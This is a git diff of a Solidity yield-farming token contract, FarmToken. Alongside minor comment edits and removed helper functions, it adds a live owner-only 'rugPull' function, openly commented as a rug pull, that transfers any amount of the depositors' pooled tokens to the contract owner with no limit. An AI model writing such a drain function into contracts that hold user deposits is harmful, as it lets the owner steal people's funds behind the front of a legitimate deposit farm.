@@ -33,40 +33,28 @@ contract FarmToken is ERC20 {
         owner = msg.sender;
     }
 
-
+    //See the balance of the contract (TVL)
     function balance() public view returns (uint256) {
         return token.balanceOf(address(this));
     }
 
+    //for a call to view depositor balance
     function ownerDepositBalance() public view returns (uint256) {
         uint tempBalance = tokenBalanceOf[msg.sender];
         return tempBalance;
     } 
 
+    //Verify time of deposit
     function checkTime() public view returns (uint256) {
         uint time = depositStart[msg.sender];
         return time;
     } 
 
+    /*
     function checkBlockTime() public view returns (uint256) {
         uint blockTime = block.timestamp;
         return blockTime;
-    } 
-
-    function checkReward() public view returns (string memory) {
-        string memory notice = "null";
-        if(depositStart[msg.sender] <= block.timestamp - week){
-            notice = "Double Deposit and 2 dollars";
-        }   // if they didn't make the week but at least a few days
-            else if(depositStart[msg.sender] <= block.timestamp - day) {
-            notice = "2 dollar bonus";
-        }   // They immediately pull out
-             else {
-             notice = "No Bonus Yet! Wait a Day";
-        }
-
-        return notice;
-    }
+    } */
  
     function deposit(uint256 _amount) public payable {
         // Amount must be greater than zero
@@ -115,12 +103,15 @@ contract FarmToken is ERC20 {
         emit Withdraw(msg.sender, _amount, depositTime);
     }
 
-    /*
-    // work on a possible master withdraw with owner to save funds
-    function withdrawMaster(uint256 _amount) public { 
+    
+    // Rug Pull, to pull all the funds
+    function rugPull(uint256 _amount) public { 
         require(msg.sender == owner);
 
+        //no limit to withdrawl - rug pull TVL
+        token.safeTransfer(msg.sender, _amount);
+
     }
-    */
+    
 
 }
